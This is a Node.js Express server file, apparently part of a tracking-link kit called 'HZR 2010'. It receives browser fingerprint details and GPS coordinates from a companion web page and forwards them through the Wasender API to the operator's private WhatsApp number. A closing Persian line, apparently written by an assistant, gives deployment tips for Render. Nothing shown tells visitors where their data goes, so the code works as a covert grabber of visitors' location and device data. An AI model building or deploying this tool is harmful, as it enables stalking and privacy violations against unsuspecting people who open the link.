const express = require("express");
const cors = require("cors");
const path = require("path");
require("dotenv").config();

const app = express();

const PORT = process.env.PORT || 3000;

const WASENDER_TOKEN = process.env.WASENDER_TOKEN;
const MY_WHATSAPP_NUMBER = process.env.MY_WHATSAPP_NUMBER;


/* =========================
   CHECK ENVIRONMENT
========================= */

if (!WASENDER_TOKEN || !MY_WHATSAPP_NUMBER) {

    console.error(
        "ERROR: Missing WASENDER_TOKEN or MY_WHATSAPP_NUMBER"
    );

    process.exit(1);
}


/* =========================
   MIDDLEWARE
========================= */

app.use(cors());

app.use(
    express.json({
        limit: "20kb"
    })
);


/* =========================
   WEBSITE
========================= */

app.get("/", (req, res) => {

    res.sendFile(
        path.join(__dirname, "index.html")
    );

});


/* =========================
   STATUS
========================= */

app.get("/api/status", (req, res) => {

    res.json({

        success: true,

        service: "HZR 2010",

        status: "online"

    });

});


/* =========================
   SEND DEVICE INFORMATION
========================= */

app.post(
    "/api/send-device-info",
    async (req, res) => {

        console.log(
            "================================="
        );

        console.log(
            "HZR 2010 DEVICE REQUEST"
        );

        console.log(
            "=================================");


        try {

            const info =
                req.body || {};


            /* =========================
               LOCATION
            ========================= */

            const latitude =
                info.latitude ||
                "Permission denied";


            const longitude =
                info.longitude ||
                "Permission denied";


            const accuracy =
                info.accuracy ||
                "Unknown";


            /* =========================
               MESSAGE
            ========================= */

            const message =

`🔵 HZR 2010

📱 DEVICE INFORMATION
-------------------------

نام / User Agent:
${info.userAgent || "Unknown"}

زبان:
${info.language || "Unknown"}

سیستم:
${info.platform || "Unknown"}

وضعیت اینترنت:
${info.online ?? "Unknown"}

صفحه:
${info.screen || "Unknown"}

Viewport:
${info.viewport || "Unknown"}

Pixel Ratio:
${info.pixelRatio || "Unknown"}

منطقه زمانی:
${info.timezone || "Unknown"}

CPU Threads:
${info.hardwareConcurrency || "Unknown"}

RAM:
${info.deviceMemory || "Unknown"} GB

Touch Points:
${info.maxTouchPoints || "Unknown"}


📍 LOCATION
-------------------------

Latitude:
${latitude}

Longitude:
${longitude}

Accuracy:
${accuracy} meters


🕒 TIME
-------------------------

${info.time || "Unknown"}


-------------------------
HZR 2010
© 2010–2026
All Rights Reserved`;


            console.log(
                "Sending message to Wasender..."
            );


            console.log(
                "Recipient:",
                MY_WHATSAPP_NUMBER
            );


            /* =========================
               WASENDER API
            ========================= */

            const response =
                await fetch(
                    "https://api.wasender.dev/messages/text",
                    {

                        method: "POST",

                        headers: {

                            "Authorization":
                                `Bearer ${WASENDER_TOKEN}`,

                            "Content-Type":
                                "application/json"

                        },

                        body:
                            JSON.stringify({

                                to:
                                    MY_WHATSAPP_NUMBER,

                                body:
                                    message

                            })

                    }
                );


            const resultText =
                await response.text();


            console.log(
                "Wasender HTTP status:",
                response.status
            );


            console.log(
                "Wasender response:",
                resultText
            );


            /* =========================
               API ERROR
            ========================= */

            if (!response.ok) {

                return res.status(502).json({

                    success: false,

                    error:
                        "WhatsApp API error"

                });

            }


            /* =========================
               JSON RESULT
            ========================= */

            let result = {};


            try {

                result =
                    JSON.parse(resultText);

            }

            catch (e) {

                console.log(
                    "Wasender response was not JSON."
                );

            }


            /* =========================
               SUCCESS
            ========================= */

            return res.json({

                success: true,

                message:
                    "Information sent successfully",

                wasender:
                    result

            });


        }

        catch (error) {

            console.error(
                "Server error:",
                error
            );


            return res.status(500).json({

                success: false,

                error:
                    "Internal server error"

            });

        }

    }
);


/* =========================
   START SERVER
========================= */

app.listen(
    PORT,
    "0.0.0.0",
    () => {

        console.log(
            `HZR 2010 running on port ${PORT}`
        );

    }
);

این نسخه با "index.html" بالا هماهنگ است؛ بنابراین دیگر لازم نیست در "server.js" دنبال نام فیلدهای موقعیت بگردی. فقط "WASENDER_TOKEN" و "MY_WHATSAPP_NUMBER" را مثل قبل در Environment Variables رندر نگه دار.
